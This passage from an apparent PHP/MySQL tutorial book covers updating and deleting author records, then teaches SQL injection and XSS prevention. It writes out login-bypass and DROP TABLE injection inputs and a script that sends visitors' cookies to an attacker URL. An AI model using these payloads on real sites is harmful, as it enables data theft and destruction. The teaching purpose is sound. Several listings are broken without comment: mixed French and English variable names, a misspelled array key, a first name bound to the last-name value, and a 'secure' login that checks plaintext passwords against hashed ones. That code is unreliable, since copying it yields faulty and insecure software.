 $request\->bindParam(':new\_password', $new\_password);  
 $request\->bindParam(':new\_biography', $new\_biography);  
 $request\->bindParam(':author\_id', $author\_id);  
  
 // Execute query  
 $result = $request\->execute();  
  
 // Verify successful update  
 if ($result) {  
 echo "Information updated successfully";  
 } else {  
 echo "An error occurred during the update";  
 }  
?>

 

This PHP code illustrates the process of updating the information of a single author with author\_id = 1 in the "authors" table. In this operation, the new values for the author's last name, first name, email, password and biography are defined beforehand. A database connection is then established using PDO. An update SQL query is prepared using the PDO object's prepare() method, where the **UPDATE ... SET** statement is used to specify the columns to be updated and the new values. The values of the new author information and the author ID to be updated are then bound to the query parameters using the bindParam() method. Finally, the update request is executed using the PDO object's execute() method.

If you execute this code, you should normally get the message :

 

![Image](images/image-155.png)

 

When you consult the data in the "authors" table, you will see that the information for the author with ID 1 has been modified:

 

![Image](images/image-156.png)

 

You may have noticed in the previous code that the author ID and the new data were defined statically. In practice, however, it is essential to retrieve them dynamically.

 

This can be achieved in a number of ways: for example, by setting up a form where the user can enter the identifier of the author concerned, followed by its retrieval. Another option is to addition a link in front of each line of the table displaying all authors, enabling the corresponding author ID to be transmitted. It's this latter approach that we'll be developing in what follows.

 

New data can be managed via a form. This will first display the old data to be updated, then allow the user to enter the new information.

 

### Updating the bulletin board of all authors

 

In the previous chapter, we developed the process of displaying the data of all authors in a table. In this section, we will enhance this process by adding a link to each row of the table. This link will pass the author's identifier to a script called "form\_edit\_author.php", which will retrieve the data of the author corresponding to this identifier and display this data in a form allowing new information to be entered.

 

In the file display\_authors.php, we make two main changes:

 

We add a column to the display table with a header titled "Edit": <th>Edit</th>.

We then add the "Edit" link to each table cell:

 

echo "<td><a href='form\_edit\_author.php?id={$author\['author\_id'\]}'>  
Edit</a></td>";

 

Here is the modified version of the "display\_authors.php" file:

 

 

<!DOCTYPE html\> <html lang\="en">  
<head\> <meta charset\="UTF-8">  
<meta name\="viewport" content\="width=device-width, initial-scale=1.0">  
<title\>List of Authors</title\>  
<link rel\="stylesheet" href\="style\_tab.css">  
</head\>  
  
<body\>  
 <h2\>List of Authors</h2\>  
 <?php  
 // Part1 - select and retrieve all authors   
$connection = new PDO("mysql:host=localhost;dbname=library", "root","");  
$connection\->setAttribute(PDO::ATTR\_ERRMODE, PDO::ERRMODE\_EXCEPTION);  
 

 $query = $connection\->prepare("SELECT \* FROM authors");  
 $query\->execute();  
 $authors = $query\->fetchAll(PDO::FETCH\_ASSOC);  
  
 // Part 2 - Displaying results in an HTML table  
 if (count($authors) > 0) {  
 echo "<table>";  
 echo "<tr>  
 <th>Edit</th>  
 <th>ID</th>  
 <th>Last Name</th>  
 <th>First Name</th>  
 <th>Email</th>  
 <th>Biography</th>  
 </tr>";  
 foreach ($authors as $author) {  
 echo "<tr>";  
 echo "<td>{$author\['author\_id'\]}</td>";  
 echo "<td>{$author\['last\_name'\]}</td>";  
 echo "<td>{$author\['first\_name'\]}</td>";  
 echo "<td>{$author\['email'\]}</td>";  
 echo "<td>{$author\['biography'\]}</td>";  
 echo "<td><a href='form\_edit\_author.php?author\_id={$author\['author\_id'\]}'>  
Edit</a></td>";  
  
 echo "</tr>";  
 }  
 echo "</table>";  
 } else {  
 echo "No author found.";  
 }  
?>  
</body\>  
</html\>

 

These modifications addition a "Edit" column to the author display table, where each line contains a "Edit" link pointing to a script named "form\_edit\_author.php" with the corresponding author ID passed as a parameter.

Executing this code produces a result similar to the following:

 

![Image](images/image-157.png)

 

Then create a new empty script named form\_edit\_author.php.

When you click on the "Edit" link, you are redirected to this file "form\_edit\_author.php", and the corresponding author ID is transmitted via the URL.

 

![Image](images/image-158.png)

 

### Retrieving and displaying data in a form

 

In the "form\_edit\_author.php" file that we previously created, we retrieve the author's ID to be updated from the URL using the $\_GET superglobal. Then, we query the database to retrieve all the data of the author in question into an associative array.

 

*   **Retrieving data from the database**

 

 

<?php  
  
// Retrieve the author ID to be updated  
 $author\_id = $\_GET\['author\_id'\];  
  
 // Connect to database  
$connection = new PDO("mysql:host=localhost;dbname=library", "root","");  
$connection\->setAttribute(PDO::ATTR\_ERRMODE, PDO::ERRMODE\_EXCEPTION);  
  
 // Prepare selection query  
 $query = $connection\->prepare("SELECT \* FROM authors WHERE author\_id = :author\_id");  
  
 $query\->bindParam(':author\_id', $author\_id);  
  
 // Execute request  
 $query\->execute();  
  
 // Retrieve results  
 $author = $query\->fetch(PDO::FETCH\_ASSOC);

 

 

This PHP code is used to retrieve a specific author's information from the database and display it in a modification form. Here's a detailed explanation of the code:

 

**$\_GET\['author\_id\]**: This line retrieves the author identifier transmitted in the URL and is accessible via the $\_GET superglobal variable.

 

The **fetch(PDO::FETCH\_ASSOC)** method is used to retrieve the first row of query results in the form of an associative array. This array contains the author data retrieved from the database.

 

*   **Save recovered data in variables**

 

Then, if there is an author with the identifier passed in URL, the data stored in the associative array $author in variables to facilitate their use.

 

 // Check if author exists  
 if($author) {  
 // Retrieve author information  
 $lastname = $author\['last\_name'\];  
 $firstname = $author\['firs\_tname'\];  
 $email = $author\['email'\];  
 $password = $author\['password'\];  
 $biography = $author\['biography'\];  
 }

 

 

 

This code segment is used to extract author information retrieved from the database and store it in individual variables for later use in a modification form. For example: the line $lastname=$author\['lastname'\]; extracts the value of the author's "last\_name" column from the associative array $author and stores it in the variable $lastname. This means that the variable $lastname now contains the author's last name retrieved from the database.

 

*   **Displaying data in a form**

 

Once this has been done, we display this data in a form similar to the one used to register a new author in the previous chapter.

 

 

 

 <form action\="modify\_author.php" method\="POST">  
 <h2\>Edit an Author</h2\>  
 <label\>Last Name:</label\>  
 <input type\="text" name\="lastname" value\="<?= $lastname ?>"><br\>  
 <label\>Firstname:</label\>  
 <input type\="text" name\="firstname" value\="<?= $firstname ?>"><br\>  
 <label\>Email:</label\>  
 <input type\="email" name\="email" value\="<?= $email ?>"><br\>  
 <label\>Password:</label\>  
 <input type\="password" name\="password" value\="<?= $password ?>"><br\>  
 <label\>Biography:</label\>  
 <textarea name\="biography"><?=$biography ?></textarea\><br\>  
 <input type\="hidden" name\="author\_id" value\="<?= $author\_id ?>">  
 <input type\="submit" value\="Edit">  
 </form\>

 

 

This HTML code represents a form for modifying author information in the database. Here's a detailed explanation:

 

The action attribute of the <form> tag specifies the URL of the PHP script that will process the form data once submitted. In this case, it's "modify\_author.php" and the HTTP method used is POST.

 

Inside the <form> tag, a <h2> heading is used to indicate that the form is intended for author modification.

 

Next, a series of <input> fields and a <textarea> field are used to enter the author's new information. Each field has a name attribute that corresponds to the field name in the $\_POST array when the form is submitted.

 

Current field values are defined with PHP, using <?= tags to display PHP variables containing the author's current data. For example: value="<?= $lastname ?\>" sets the value of the variable $lastname in the form's lastname field.

 

The password field uses type="password", which hides the characters entered for security reasons.

 

A <input> field of type "hidden" is used to store the author ID, but is not visible to the user. This allows the author ID to be passed to the processing PHP script without the user having to enter it.

Finally, a "submit" button is used to submit the form and send the data to the PHP script for processing.

 

This form allows the user to modify an author's information and submit it for updating in the database.

 

Here is the complete code of the script form\_edit\_author.php :

 

<!DOCTYPE html\>  
<html lang\="fr">  
<head\>  
<meta charset\="UTF-8">  
<meta name\="viewport" content\="width=device-width, initial-scale=1.0">  
<title\>Edit Author</title\>  
<link rel\="stylesheet" href\="style.css">  
</head\>  
<body\>  
  
<?php  
  
// Retrieve the author ID to be updated  
$author\_id = $\_GET\['author\_id'\];  
  
// Connect to database  
$connection = new PDO("mysql:host=localhost;dbname=library", "root","");  
$connection\->setAttribute(PDO::ATTR\_ERRMODE, PDO::ERRMODE\_EXCEPTION);  
  
// Prepare selection query  
$query = $connection\->prepare("SELECT \* FROM authors WHERE author\_id = :author\_id");  
  
 $query\->bindParam(':author\_id', $author\_id);  
  
 // Execute request  
 $query\->execute();  
  
 // Retrieve results  
 $author = $query\->fetch(PDO::FETCH\_ASSOC);  
  
 // Check if author exists  
 if($author) {  
 // Retrieve author information  
 $lastname = $author\['last\_name'\];  
 $firstname = $author\['first\_name'\];  
 $email = $author\['email'\];  
 $password = $author\['password'\];  
 $biography = $author\['biography'\];  
 }  
?>  
  
 <form action\="modify\_author.php" method\="POST">  
 <h2\>Edit an Author</h2\>  
 <label\>Last Name:</label\>  
 <input type\="text" name\="lastname" value\="<?=$lastname ?>"><br\>  
 <label\>Firstname:</label\>  
 <input type\="text" name\="firstname" value\="<?=$firstname?>"><br\>  
 <label\>Email:</label\>  
 <input type\="email" name\="email" value\="<?= $email ?>"><br\>  
 <label\>Password:</label\>  
 <input type\="password" name\="password" value\="<?=$password?>"><br\>  
 <label\>Biography:</label\>  
 <textarea name\="biography"><?=$biography ?></textarea\><br\>  
 <input type\="hidden" name\="author\_id" value\="<?= $author\_id ?>">  
 <input type\="submit" value\="Edit">  
 </form\>  
  
</body\>  
</html\>

 

At this point, if you select one of the links in the "Edit" column of the table displaying all authors, you will be redirected to a page similar to the one shown below:

 

![Image](images/image-159.png)

 

In addition to presenting the retrieved data, this form offers the possibility of making modifications before being submitted. When the form is validated, it is directed to the modify\_author.php script, which is responsible for updating the data in the database using the information entered in the form. This is the code of the " modify\_author.php " script after it has been updated:

 

<?php  
 $author\_id = $\_POST\['author\_id'\]; // Author ID to be updated  
  
 // New author information  
 $new\_lastname = $\_POST\['lastname'\];  
 $new\_firstname = $\_POST\['firstname'\];  
 $new\_email = $\_POST\['email'\];  
 $new\_password = $\_POST\['password'\];  
 $new\_biography = $\_POST\['biography'\];  
  
// Hash password  
 $password\_hashed = password\_hash($new\_password, PASSWORD\_DEFAULT);  
  
 // Database connection  
$connection = new PDO("mysql:host=localhost;dbname=library", "root","");  
  
 // Update request  
 $request = $connection\->prepare("UPDATE authors SET last\_name = :new\_lastname, first\_name = :new\_firstname, email = :new\_email, password = :new\_password, biography = :new\_biography WHERE author\_id = :author\_id");  
  
 // Bind parameters  
 $request\->bindParam(':author\_id', $author\_id);  
 $request\->bindParam(':new\_lastname', $new\_lastname);  
 $request\->bindParam(':new\_firstname', $new\_lastname);  
 $request\->bindParam(':new\_email', $new\_email);  
 $request\->bindParam(':new\_password', $password\_hashed);  
 $request\->bindParam(':new\_biography', $new\_biography);  
  
 // Execute query  
 $result = $request\->execute();  
  
 // Check update success  
 if ($result) {  
 echo "Information updated successfully";  
 } else {  
 echo "An error occurred during the update.";  
 }  
?>

 

This PHP code retrieves the data submitted by the author's modification form via the POST method. Using the $\_POST superglobal, it first retrieves the author ID to be updated, along with new information such as first and last name, email, password and biography.

 

The password is then hashed using the password\_hash() function for security reasons. A connection to the database is then established using PDO.

 

An update query is prepared to update the author's information in the "authors" table. The query parameters are linked to the values retrieved from the form.

 

The request is then executed and the result checked. If the update is successful, a success message is displayed. Otherwise, an error message is returned.

## Deleting data from a database

In this new section, we'll look at the process of deleting data from a database using PHP and MySQL. Deleting data is a critical operation that requires special care to avoid any unintentional loss or damage to existing data. We'll explore different methods for deleting records in a database table, with an emphasis on good security and efficiency practices. You'll learn how to build and execute deletion queries securely, as well as how to deal with any errors that may arise during the process.

 

We'll start by exploring the simplest method, which involves using a **SQL DELETE** query to delete individual records or sets of records based on certain criteria. We'll also discuss the precautions to be taken when using this method to avoid unintentional or unauthorized deletion of data.

 

To illustrate the process of deleting data, we will be further developing our "library" project. We'll be providing detailed explanations of how to carry out this operation safely and efficiently in your own projects.

 

In the "display\_authors.php" page, which displays all authors, we'll introduce a new column called "Delete". Each cell in this column will contain a link allowing the corresponding author ID to be transmitted to a new "delete\_author.php" file. This file will be responsible for processing the deletion of the selected author. Here is the code of the display\_authors.php script after it has been updated:

 

<!DOCTYPE html> <html lang="en"> <head> <meta charset="UTF-8"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <title>List of Authors</title> <link rel="stylesheet" href="style\_tab.css"> </head> <body>  
 <h2>List of Authors</h2>  
 <?php  
  
 // Database connection  
 $connexion \= new PDO("mysql:host=localhost;dbname=bibliotheque", "root", "");  
 $connexion->setAttribute(PDO::ATTR\_ERRMODE, PDO::ERRMODE\_EXCEPTION);  
  
 // Prepare selection query  
 $query \= $connection->prepare("SELECT \* FROM authors");  
  
 // Execute query  
 $requete->execute();  
  
 // Retrieve results  
 $authors \= $requete->fetchAll(PDO::FETCH\_ASSOC);  
  
 // Display results in HTML table  
 if (count($authors) > 0) {  
 echo "<table\>";  
 echo "<tr>

 <th>ID</th>

 <th>Name</th>

 <th>First name</th>

 <th>Email</th>

 <th>Biography</th>

 <th>Edit</th>

 <th>Delete</th>

 </tr\>";  
 foreach ($authors as $author) {  
 echo "<tr\>";  
 echo "<td>{$author\['author\_id'\]}</td\>";  
 echo "<td>{$author\['name'\]}</td>";  
 echo "<td>{$author\['firstname'\]}</td>";  
 echo "<td>{$author\['email'\]}</td>";  
 echo "<td>{$author\['biography'\]}</td>";  
 echo "<td>

 <a href='form\_modifier\_auteur.php?id\_auteur={$auteur\['id\_auteur'\]}'>

 Edit

 </a></td\>";

 echo "<td>

 <a href='supprimer\_auteur.php?id\_auteur={$auteur\['id\_auteur'\]}'>

 Delete

 </a></td\>";

 

 

 echo "</tr\>";  
 }  
 echo "</table\>";  
 } else {  
 echo "No author found.";  
 }  
  
?> </body> </html>

 

 

In the "display\_authors.php" script, a new "Delete" column has been added to the author table. This column is identified by the "Delete" header, defined by the following code:

 

 <th>Delete</th>

 

Each line in this column contains a link to the file "delete\_author.php" with a delete action.

 

 

<?php  
 echo "<td>  
 <a href='delete\_author.php?author\_id={$author\['author\_id'\]}'>  
 Delete   
 </a>  
 </td>";

 

 

This modification provides users with an additional feature to directly delete a specific author from the list displayed in the table. When accessing the "display\_authors.php" script, you will get a result similar to the one shown below:

 

![Image](images/image-160.png)

 

We then created a new empty file named "delete\_author.php" at the root of the "library" project. If you currently click on the first link in the "Delete" column, you'll be taken to a blank page, as the "delete\_author.php" file is still empty. However, note the URL that transmits the author ID in the "author\_id " parameter.

 

![Image](images/image-161.png)

 

 

Here is the code allowing the deletion of the author whose identifier is passed in the URL:

 

<?php  
 // Check if the ID of the author to be deleted is present in the URL  
 if(isset($\_GET\['author\_id'\])) {  
 // Retrieve author ID from URL  
 $author\_id = $\_GET\['author\_id'\];  
  
 // Connect to database  
$connection = new PDO("mysql:host=localhost;dbname=library", "root","");  
$connection\->setAttribute(PDO::ATTR\_ERRMODE, PDO::ERRMODE\_EXCEPTION);  
  
 // Prepare deletion request  
 $request = $connection\->prepare("DELETE FROM authors WHERE author\_id= :author\_id");  
  
 // Bind parameters  
 $request\->bindParam(':author\_id', $author\_id);  
  
 // Execute query  
 $result = $request\->execute();  
  
 // Verify successful deletion  
 if ($result) {  
 echo "The author has been successfully deleted.";  
 } else {  
 echo "An error occurred during deletion";  
 }  
 } else {  
 echo "No author ID specified for deletion";  
 }  
?>

 

This PHP code performs the following operations:

 

*   Check for the presence of the author ID to be deleted in the URL using the isset($\_GET\['author\_id'\])) condition. This ensures that an author ID has been correctly transmitted before proceeding with deletion.

 

*   If the author ID is present in the URL, it is retrieved from the superglobal $\_GET\['author\_id'\].

 

*   A database connection is established using PDO, with the appropriate credentials.

 

*   A delete request is prepared to delete the author from the "authors" table, where the author ID corresponds to the one passed in the URL.

 

*   The query parameters are bound to the author ID using the bindParam() method.

 

*   The query is executed using the execute() method.

 

*   Depending on the result of the deletion, an appropriate message is displayed to the user to indicate whether the operation was successful or whether there was an error.

 

This script ensures that only a valid author ID is used for deletion, thereby avoiding any unauthorized or unintended deletions in the database.

When you click on any of the "Delete" links, you will receive the message "The author has been successfully deleted." If you check your database, you will find that the respective author has indeed been deleted from the "authors" table.

 

When you click on the "Delete" link and if everything goes well, the message "The author has been successfully deleted." is displayed. Furthermore, if you check the authors table, you would notice that the respective author is indeed deleted.

 

![Image](images/image-162.png)

 

Confirmation of deletion

 

Deleting data from a database can sometimes have significant consequences. This is why it is essential to implement a confirmation mechanism before executing a deletion operation, to avoid accidental or unwanted deletions. Always ask for confirmation before carrying out a final deletion.

 

To addition deletion confirmation before permanently deleting the author, you can use, for example, a JavaScript dialog box to ask the user to confirm his action.

In the "display\_authors.php" file, modify the delete link to call a JavaScript function that displays a confirmation dialog box:

 

 

echo "<td>

 <a href='delete\_author.php?author\_id={$author\['author\_id'\]}' onclick='return confirmDelete()'>

 Delete

 </a></td>";

 

 

In the deletion link of the table displaying all authors, we've integrated the onclick attribute with the value 'return confirmDelete()'. This triggers a call to the JavaScript function confirmDeletion() when a user clicks on the associated element. The return keyword is used to convey the return value of this function. In this context, we'll create a new JavaScript function that we'll call confirmDelete(). This function displays a confirmation dialog to the user, inviting them to confirm whether they really wish to perform the associated action, such as deleting an element. If the user confirms, the function returns true, allowing the click event to proceed normally and execute the intended action. On the other hand, if the user cancels the confirmation, the function returns false, thus cancelling the click action and preventing any further action. It's important to note that this book doesn't focus on JavaScript, so we won't go into detail on these concepts. Next, we create the JavaScript function named "confirmDelete()" in a <script> tag, located between the <head> tags of the display\_authors.php file.

 

 

 <script\>  
 function confirmDelete() {  
 return confirm("Do you really want to delete this author?");  
 }  
 </script\>

 

 

From now on, when you click on one of the author deletion links, a confirmation box will appear, as shown below:

 

![Image](images/image-163.png)

 

## Conclusion

In this chapter, we've taken a deep dive into the crucial aspects of data management within a database, focusing on the update and deletion processes. By understanding these fundamental operations, you now have powerful tools for maintaining the integrity and relevance of your data.

 

Updating data is essential to keep information up-to-date and accurate. Thanks to the techniques we've explored, such as the use of secure SQL queries and parameter binding, you can modify existing data with confidence, minimizing the risk of errors or vulnerabilities.

 

On the other hand, data deletion is a delicate task that requires a considered approach. We have highlighted the importance of confirmation before the deletion operation is carried out, a crucial practice in avoiding irreversible errors and preventing the loss of valuable data. By implementing this confirmation step, you reinforce the security of your application and protect against accidental deletions.

 

By combining a thorough understanding of the basic principles of data manipulation with secure development practices, you can guarantee the robustness and reliability of your applications. By using the techniques and best practices presented in this chapter, you'll be well equipped to effectively manage your project data, ensuring its integrity and security throughout its lifecycle.

 

# SECTION D

# WEB APPLICATION SECURITY

#  

In the vastness of web development, if there's one constant that all developers agree on, it's the paramount importance of security. The "Web Application Security" section of this book is an essential roadmap for any PHP developer wishing to build applications that are not only functional, but also resilient in the face of growing threats in cyberspace.

 

The Internet is a dynamic ecosystem where new web applications are being created all the time, and with them, new vulnerabilities. Cyberattacks are becoming more sophisticated and can have catastrophic consequences, from breaches of personal data to the destabilization of critical services. That's why, as creators and guardians of these digital spaces, it's our duty to design them with security as their foundation.

 

In this section, we'll take a look at the mechanisms of the most common attacks and strategies for countering them. We'll look at defenses against server-side attacks, where data and systems are most vulnerable. We'll talk about preventing SQL injections, protecting against XSS and CSRF, and much more.

 

But security isn't just about preventing attacks. It's also about taking a holistic, layered approach to risk management. That's why we'll also cover best practices, from principles of least privilege to error and log management, encryption and secure communications. This section will provide you with the tools you need to test, audit and maintain the security of your applications over the long term.

 

Tackling web application security may seem daunting, but it's an exciting and necessary challenge. Armed with the knowledge you'll gain here, you'll be ready to face this challenge head-on and make sure your applications are as secure as they deserve to be. Get ready to turn your understanding of security into a real practical skill.

 

# Chapter 13

# PHP security : Attack prevention and risk management

 

 

This chapter is essential, as it deals with defense against attacks aimed directly at the heart of your web applications: the server. Server-side security is one of the most critical aspects of web development, as servers store sensitive data and control the business logic of our applications.

 

Server-side attacks can take many forms, from SQL injections that manipulate your database, to XSS attacks that turn your websites against your users. Without taking adequate security measures, attackers can compromise the integrity of your applications, steal data or even take complete control of your systems.

 

In this chapter, we'll look at the key concepts and defense techniques that every PHP developer needs to master. We'll decipher the most common attack methods, understand their mechanisms and, above all, learn how to counter them. We'll delve into the technical details of SQL injections, explore the subtleties of XSS attacks, and demystify CSRF.

 

Securing a web application is a complex task requiring a thorough understanding of potential threats and constant attention to detail. By the end of this chapter, you'll be equipped with the knowledge and tools you need to build a fortress around your server and ensure that your application remains secure and reliable.

 

Get ready to strengthen your defenses and make server-side security a top priority in your PHP development.

 

 

## SQL injection attacks

SQL injection attacks are one of the most common and dangerous threats to web application security. They exploit security flaws in database management systems (DBMS) by injecting malicious SQL code into unfiltered or unvalidated user input.

 

This form of attack enables an attacker to execute unauthorized and potentially destructive SQL commands, such as deleting data, modifying content or even extracting confidential information from the database. The consequences can be catastrophic, ranging from data loss to the complete compromise of the application.

 

In this section, we'll explore the basics of SQL injection attacks in detail, focusing on the techniques used by attackers, the potential risks to data security and best practices for preventing and mitigating these attacks. By understanding the underlying mechanisms of these attacks and implementing appropriate security measures, developers can enhance the robustness of their web applications against this ubiquitous threat.

 

Let's consider that we have implemented an authentication system in our web application "library", as described in the previous section. In our "library" database, we have a table called "authors" containing information such as names, first names, email addresses, passwords, etc. However, it is important to note that in practice, we may also have more sensitive information, such as payment details. Let's say our application provides a login form consisting of an "Email" field and a "Password" field. If the entered email address and password exist in the authors table, the corresponding user is then authenticated and can access confidential data.

 

Here is an example of code for this form, saved in a file named form\_connection.php:

 

 <DOCTYPE html>  
<html>  
 <head>  
 <title>Connection</title>  
 </head>  
 <body>  
 <form action="connexion.php" method="post">  
 <label for="email">Email:</label>  
 <input type="text" id="email" name="email"><br><br>

 <label for="password">Password:</label>  
 <input type="password" id="password" name="password"><br>  
 <button type="submit">Log in</button>  
 </form>  
 </body>  
</html>

 

Here is an example of the code in the connection.php file that handles the connection request:

 

<?php  
 // Database connection  
$connection = new PDO("mysql:host=localhost;dbname=library", "root","");  
  
 // Retrieve user data  
 $email = $\_POST\['email'\];  
 $password = $\_POST\['password'\];  
  
 // Vulnerable SQL query (direct)  
 $sql = "SELECT \* FROM authors WHERE email = '$email' AND password = '$password'";  
  
  
 // Execute query  
 $result = $connection\->query($sql);  
  
 // Check results  
 if ($result !== false && $result\->rowCount() > 0) {  
 echo "Login successful!";  
 } else {  
 echo "Login failed.";  
 }  
?>

 

If you enter an email address and password that are stored in the "authors" table, you will receive the message "Login successful!"; however, if not, you will see "Login failed."

 

So far, everything seems normal, but if the site is not properly protected against SQL injections, as is the case with the previous code, an attacker could enter a malicious email address and a malicious password in both fields of the login form. For example, instead of entering a valid email address and password, the attacker could enter:

 

email : ' OR '1'='1  
password: ' OR '1'='1

 

![Image](images/image-164.png)

 

In this way, even if they haven't provided a valid email address and password, they could still log in.

 

In this case, the resulting SQL query from the previous code would then become:

 

 

 SELECT \* FROM authors WHERE 

 email \= '' OR '1'='1' 

 AND 

 password \= '' OR '1'='1';

 

 

In this case, the condition '1'='1' would always be true, meaning that the query would return all rows from the authors table, thereby allowing the attacker to access all information stored in the database, including sensitive user data.

 

This example illustrates how a simple SQL injection vulnerability can compromise the security of a website and allow an attacker to access confidential data. That's why it's essential to implement robust protection measures to prevent such attacks.

 

Furthermore, SQL injection can cause irreversible damage if a malicious attacker decides to delete entire tables from your database. For example, if an attacker enters an email address such as:

 

 '; DROP TABLE authors; DROP TABLE books; --

 

 

And in the "Password" field, he can enter anything:

 

![Image](images/image-165.png)

 

In this case, the SQL query would become :

 

$sql \= "SELECT \* FROM authors WHERE email = ''; DROP TABLE authors; DROP TABLE books; \--' AND password = 'password'";

 

In this malicious query, the attacker employs the SQL injection technique to execute multiple SQL statements in succession. After entering a malicious email address that concludes the SELECT query with a single quote (') to terminate the string, the attacker utilizes the DROP TABLE statement to delete the "authors" table, followed by DROP TABLE to also delete the "books" table. Finally, the attacker comments out the remainder of the query with -- to avoid any SQL errors and ensure that the DROP TABLE statements are executed. The "Password" field can be any value as it will be ignored.

 

If you submit this form by clicking the "Login" button, both the "authors" and "books" tables will be irreversibly deleted from the database.

 

Consider the extent of the damage if your database contains even more sensitive data, such as financial information, confidential medical data, or detailed personal information. In such cases, a successful SQL injection could not only compromise the confidentiality and integrity of this data, but also lead to serious legal consequences for your organization.

 

Indeed, the loss or unauthorized disclosure of such data could not only damage your company's reputation, but also expose you to lawsuits, fines and other regulatory sanctions. What's more, restoring lost or corrupted data could prove extremely costly and time-consuming, with no guarantee of total success.

 

It is therefore crucial to take proactive measures to secure your web applications against SQL injection attacks and other security threats. This means not only adopting secure development best practices, but also implementing monitoring and intrusion detection mechanisms to detect and respond rapidly to any suspicious activity.

 

How to prevent and remedy SQL injection vulnerabilities?

 

To address the SQL injection vulnerabilities present in the previously provided code, you need to use prepared statements with bound parameters. Here's how you can fix the code:

 

<?php  
 // Database connection  
$connection = new PDO("mysql:host=localhost;dbname=library", "root","");  
  
 // Retrieve user data  
 $email = $\_POST\['email'\];  
 $password = $\_POST\['password'\];  
  
 // Secure SQL query with linked parameters  
 $sql = "SELECT \* FROM authors WHERE email = :email AND password = :password";  
 $request = $connection\->prepare($sql);  
 $request\->bindParam(':email', $email);  
 $request\->bindParam(':password', $password);  
  
 // Execute request  
 $request\->execute();  
  
 // Check results  
 if ($request\->rowCount() > 0) {  
 echo "Connection successful!";  
 } else {  
 echo "Login failed.";  
 }  
?>

 

With this approach, the values of the $email and $password variables are passed as bound parameters in the prepared query. This prevents SQL injection attacks, as the parameter values are not interpreted as SQL code. What's more, it also guarantees enhanced security by preventing malicious users from altering the structure of the SQL query.

 

## Introduction to Cross-Site Scripting (XSS)

Cross-Site Scripting (XSS) is a common vulnerability that allows an attacker to inject malicious code (usually JavaScript) into web pages viewed by other users. This attack can occur when user-supplied data is not properly validated or escaped, enabling the attacker to execute code on another user's browser, thus compromising the application's security.

 

There are three main types of XSS: Reflected XSS, Stored XSS and DOM-based XSS. In the following section, we'll take a closer look at the first two types.

 

### Reflected XSS

 

In this type of attack, the malicious code is included in an HTTP request, which is then reflected by the web server in the HTML response. The attacker can then send a link containing the malicious code to the victim, who unwittingly executes it when the link is clicked.

 

Imagine a website with a search form that displays search results directly on the page. If the site doesn't properly escape special characters, an attacker could insert malicious JavaScript code into the search field.

To illustrate this first type of XSS, in the "ebookphp" directory, let's create a new file called "form\_search.php" in which we put a simple search form:

 

 

<!DOCTYPE html\>  
<html lang\="en">  
<head\>  
 <meta charset\="UTF-8"> <meta name\="viewport" content\="width=device-width, initial-scale=1.0">  
 <title\>Search Form</title\>  
 </head\>  
<body\>  
 <h2\>Search</h2\>  
 <form action\="search.php" method\="POST">  
 <label for\="search">Search:</label\>  
 <input type\="text" id\="search" name\="query">  
 <button type\="submit">Search</button\>  
 </form\>  
</body\>  
</html\>

 

 

Result:

 

![Image](images/image-166.png)

 

Next, we create another file, "search.php", which handles the processing of the form:

 

<!DOCTYPE html\>  
<html lang\="en">  
<head\>  
 <meta charset\="UTF-8"> <meta name\="viewport" content\="width=device-width, initial-scale=1.0">  
 <title\>Research results</title\>  
</head\>  
<body\>  
 <h2\>Search results</h2\>  
<?php  
 // Retrieve the search term entered in the form  
 $query = $\_POST\['query'\];  
  
 // Display results  
 echo "<p>Results for search: <strong>$query</strong></p>";  
?>  
</body\>  
</html\>

 

When you use the search form by executing the form\_search.php file and submit the form after entering, for example, "Maximilien Lambert" in the search field, you will get a result similar to this:

![Image](images/image-167.png)

 

But, if the user enters a JavaScript code such as **<script>alert('XSS reflected!')</script>** and the site doesn't perform proper validation or escaping on the search data before displaying it on the page, the malicious JavaScript script will be executed in the user's browser when they perform a search, displaying a dialog box with the message "XSS reflected!".

 

![Image](images/image-168.png)

 

To remedy the XSS vulnerability in this example, we need to sanitize the input data before displaying it on the results page. Here's how to do it:

 

Input data sanitization: Before using the $query variable in the results page, we need to sanitize the data by removing any potentially malicious HTML or JavaScript code. We can do this by using the **htmlspecialchars()** function to encode special characters.

Here is the code modified to remedy the XSS vulnerability:

 

 

<!DOCTYPE html\>  
<html lang\="en">  
<head\>  
 <meta charset\="UTF-8"> <meta name\="viewport" content\="width=device-width, initial-scale=1.0">  
 <title\>Research results</title\>  
</head\>  
<body\>  
 <h2\>Search results</h2\>  
<?php  
 // Retrieve the search term entered in the form  
 $query = htmlspecialchars($\_POST\['query'\]);  
  
 // Display results  
 echo "<p>Results for search: <strong>$query</strong></p>";  
?>  
</body\>  
</html\>

 

 

By applying this modification, the search term entered by the user will be properly sanitized before being displayed in the results page, protecting against XSS attacks by preventing the execution of malicious scripts in the user's browser.

 

In fact, **htmlspecialchars()** is a PHP function that converts certain special characters into equivalent HTML entities. It replaces characters like <, >, &, " and ' with their HTML equivalents (&lt;, &gt;, &amp;, &quot;, &#39;). This means that if the user enters something like <script>alert('XSS!');</script>, the **htmlspecialchars** function will convert the < and > tags into HTML entities (&lt; and &gt;), preventing the script tags from being executed in the browser.

 

### XSS Stored (Persistent)

 

Stored XSS, also known as persistent XSS, is more dangerous because the malicious script is stored on the server, for example in a database, and is then displayed to every user who accesses the affected page. Stored XSS occurs when insecure user-supplied data is stored by the web application and then displayed on a web page without being properly escaped or filtered. This allows an attacker to inject malicious code, such as JavaScript scripts, into a web page, which can compromise the security of users accessing it.

 

Example of a stored XSS attack :

 

Imagine an online forum where users can post comments on different topics. The website stores these comments in a database and then displays them on the corresponding pages. If the web application does not perform appropriate validation or escaping on the comments before displaying them, an attacker could submit a comment containing malicious JavaScript code.

 

For example, the attacker could submit a comment containing the following code:

 

 <script\>  
 fetch('https://www.example.com/my\_cookies.php?cookie=' + document.cookie);  
</script\>

 

 

When this comment is displayed on the web page, the malicious JavaScript code is executed in the browser of each user viewing the page. In this example, the JavaScript code sends the user's cookies to a website controlled by the attacker, compromising the confidentiality of the user's information.

 

XSS prevention Stored :

 

To prevent **stored XSS** attacks, it's essential to implement appropriate security practices, among which we cite: form input validation and output escaping :

 

**Input validation** : 

 

Always validate and filter the data provided by users before storing it in the database. This may include checking for expected data formats (e.g., email addresses), as well as using whitelists to only allow certain values.

Suppose we have a registration form on a website where users can submit comments. To validate user input, we could use built-in PHP validation functions such as filter\_var() to check if the email address is in the correct format.

 

Example of email validation in PHP:

 

 

$email = $\_POST\['email'\];  
  
 // Validate the email address  
 if (!filter\_var($email, FILTER\_VALIDATE\_EMAIL)) {  
 echo "Invalid email address";  
